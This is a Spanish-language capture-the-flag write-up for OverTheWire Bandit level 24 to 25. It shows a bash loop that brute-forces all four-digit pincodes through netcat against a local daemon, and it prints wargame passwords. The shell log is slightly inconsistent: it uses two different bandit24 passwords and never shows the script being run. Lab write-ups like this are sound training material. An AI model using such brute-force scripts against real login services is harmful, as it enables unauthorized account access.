# Level 24 -> 25
---
## Objectivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

---
## Datos de acceso
- user -> **bandit24**
- Passwor ->VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
- host ->  **bandit.labs.overthewire.org**
- port -> **2220**

---
## Solución

``` shell
bandit24@bandit:~$ mkdir /tmp/pass25
bandit24@bandit:~$ cd /tmp/pass25
bandit24@bandit:/tmp/pass25$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1231
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:/tmp/pass25$ 
bandit24@bandit:/tmp/pass25$ nano script.sh
bandit24@bandit:/tmp/pass25$ cat script.sh 
#!/bin/bash

pass=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

for num in {0000..9999};
do
	echo "$pass $num"
done |  nc localhost 30002
bandit24@bandit:/tmp/pass25$ 

Unable to create directory /home/bandit24/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit24@bandit:/tmp/pass25$ chmod 777 script.sh 
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:/tmp/pass25$ 

``` 



---
## Notas adicionales


Se utiliza fuerza bruta en el script para probar todas las posibles combinaciones, luego se envían a través de netcat al puerto 30002 junto con la contraseña.

 ### linux
 **#!/bin**/**bash**: Esta linea indica donde se encuentra el interprete de comandos en nuestro sistema.



---
## Referencias
https://es.wikipedia.org/wiki/Bash#:~:text=La%20sintaxis%20de%20%C3%B3rdenes%20de%20Bash%20incluye%20ideas%20tomadas%20desde,%3A%20%24(...).

https://computernewage.com/2019/01/13/scripting-linux-bash-crear-ejecutar-script/

https://www.hostinger.mx/tutoriales/bash-for-loop-guia-ejemplos

https://marmeus.com/post/Bandit
